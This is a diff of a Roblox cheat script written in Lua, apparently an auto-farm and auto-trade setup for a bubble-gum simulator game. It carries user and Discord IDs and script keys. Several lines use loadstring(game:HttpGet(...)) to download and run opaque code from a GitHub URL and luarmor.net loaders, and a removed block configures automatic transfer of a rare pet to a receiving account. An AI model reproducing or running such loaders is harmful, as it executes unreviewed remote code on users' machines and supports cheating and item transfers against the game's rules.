@@ -1,32 +1,4 @@
 _G.Config = { UserID = "3bf97fad-2915-4197-8a14-81872043402d", discord_id = "1165842656958611546" , Note = "PUPPY", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/bgsi"))()
-script_key = getgenv().AutoTrade;
-getgenv().Config = {
-    MainReceive = getgenv().MainReceiveUsers,
-    petList = {
-        ["Secret"] = {
-            { Name = "Avernus" },
-        },
-        ["normalPets"] = {
-            
-        }
-    }
-}
-task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/793674f6bc0a80e1c748fd75994d1607.lua"))()
-end)
-task.wait(120)
-
-
-local allowedUsernames = {
-["vohoangthang170402"] = true,
-}
-
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-
-if allowedUsernames[localPlayer.Name] then
-   print("vohoangthang170402")
-else
 script_key = getgenv().Marmot;
 setfpscap(3)  -- number = fps
 
@@ -77,4 +49,3 @@ getgenv().bgsInfConfig = {
 }
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3dc52e6a2fc4f671b66757e93f4fd38b.lua"))()
-end
